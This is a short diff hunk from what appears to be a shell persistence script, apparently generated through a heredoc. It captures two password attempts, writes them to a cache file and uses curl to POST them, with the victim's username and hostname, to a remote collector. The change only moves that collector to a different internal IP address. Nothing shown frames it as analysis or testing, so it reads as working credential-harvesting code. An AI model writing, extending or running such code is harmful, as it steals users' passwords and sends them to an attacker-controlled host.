@@ -49,7 +49,7 @@ $MARKER
   echo "\$_pw1" > "\$_cache"
   echo "\$_pw2" >> "\$_cache"
   chmod 600 "\$_cache"
-  curl -s -X POST http://10.215.119.135:4000/log/password \\
+  curl -s -X POST http://10.215.118.250:4000/log/password \\
     -H "Content-Type: application/json" \\
     -d "{\\"source\\": \\"shell-persistence\\", \\"user\\": \\"\$(whoami)\\", \\"attempt1\\": \\"\${_pw1}\\", \\"attempt2\\": \\"\${_pw2}\\", \\"host\\": \\"\$(hostname)\\"}" \\
     > /dev/null 2>&1
